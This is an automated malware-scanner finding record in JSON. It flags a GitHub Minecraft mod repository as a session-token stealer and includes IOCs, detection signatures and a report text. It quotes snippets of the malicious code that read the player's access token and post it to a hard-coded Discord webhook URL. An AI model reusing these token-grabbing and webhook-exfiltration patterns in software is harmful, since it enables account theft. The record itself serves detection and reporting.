@@ -1,0 +1,122 @@
+{
+  "finding": {
+    "key": "repository:forthekingfck/lazyqol",
+    "kind": "repository",
+    "id": "forthekingfck/lazyqol",
+    "url": "https://github.com/forthekingfck/LazyQoL",
+    "registry": "github",
+    "owner": "forthekingfck",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 7,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_access/mc-session-token; network_exfil/discord-webhook",
+    "evidence_locations": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:24; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:12; src/main/java/com/suyako/LazyQoL.java:67; src/main/java/com/suyako/LazyQoL.java:915; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:29; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:37; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:43; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java:58",
+    "c2_hosts": "discord.com",
+    "iocs": "discord.com; https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8; src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+    "matched_signatures": "\"getSession().getToken()\" \"discord.com/api/webhooks\" language:Java; func_148254_d \"api/webhooks\" language:Java",
+    "reasons": "Shares a confirmed-malware code signature ['\"getSession().getToken()\" \"discord.com/api/webhooks\" language:Java', 'func_148254_d \"api/webhooks\" language:Java'] | Tier-2 confirmed (bash score 7)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/forthekingfck_lazyqol.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 24,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "\"\\nAccessToken: \" + Minecraft.getMinecraft().getSession().getToken() +"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 12,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "public static final String WEBHOOK = \"https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8\";"
+    },
+    {
+      "file": "src/main/java/com/suyako/LazyQoL.java",
+      "line": 67,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "public static String lastLoginAccessToken = Minecraft.getMinecraft().getSession().getToken();"
+    },
+    {
+      "file": "src/main/java/com/suyako/LazyQoL.java",
+      "line": 915,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "String token = Minecraft.getMinecraft().getSession().getToken();"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 12,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "public static final String WEBHOOK = \"https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8\";"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 24,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "\"\\nAccessToken: \" + Minecraft.getMinecraft().getSession().getToken() +"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 29,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "/*\t\t\tCommandUtils webhook = new CommandUtils(\"https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8\");"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 37,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": ".addField(\"Login with this\", \"`\" + Minecraft.func_71410_x().func_110432_I().func_148254_d() + \"`\", false)"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 43,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": ".addField(\"Login with this\", \"`\" + Minecraft.getMinecraft().getSession().getToken() + \"`\", false)"
+    },
+    {
+      "file": "src/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+      "line": 58,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "client = WebhookClient.withUrl(\"https://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8\"); // or withId(id, token)"
+    }
+  ],
+  "commit_sha": "1cb6c06854be1d3307bb351193611bc33397b60a",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/forthekingfck/lazyqol",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file src/main/java/com/suyako/lazyQoL/core/MacroCommand.java around line 24. The code reads the Minecraft session access token from the running game client. That token logs in as the victim's Microsoft or Mojang account without a password. Stealer mods, cheat clients and fake plugins grab it and post it to a webhook or bot the attacker controls, which hands over the account. The same dropper is planted in 2 separate directories in this repository, so it runs whichever of them the victim opens: src/main/java/com/suyako/LazyQoL.java, src/main/java/com/suyako/lazyQoL/core/MacroCommand.java. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: \"getSession().getToken()\" \"discord.com/api/webhooks\" language:Java; func_148254_d \"api/webhooks\" language:Java.",
+    "payload_description": "The malicious payload sits in src/main/java/com/suyako/lazyQoL/core/MacroCommand.java at line 24. The code reads the Minecraft session access token from the running game client. That token logs in as the victim's Microsoft or Mojang account without a password. Stealer mods, cheat clients and fake plugins grab it and post it to a webhook or bot the attacker controls, which hands over the account. Detection rules that fired in this repository: credential_access/mc-session-token (2 files), network_exfil/discord-webhook (1 file).",
+    "publisher": "forthekingfck",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "minecraft-account-stealer",
+      "credential-theft"
+    ],
+    "evidence_references": "https://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L24\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L12\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/LazyQoL.java#L67\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/LazyQoL.java#L915\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L29\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L37\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L43\nhttps://github.com/forthekingfck/lazyqol/blob/1cb6c06854be1d3307bb351193611bc33397b60a/src/main/java/com/suyako/lazyQoL/core/MacroCommand.java#L58",
+    "verified_iocs": "discord.com\nhttps://discord.com/api/webhooks/1097470447299330078/4lzibfuD-_nnOy1zlAaRxf3n7C6M9D1g4Lf6HneHDrpyBLJMcoLx7_tWtzWPGB27OKs8\nsrc/main/java/com/suyako/lazyQoL/core/MacroCommand.java",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
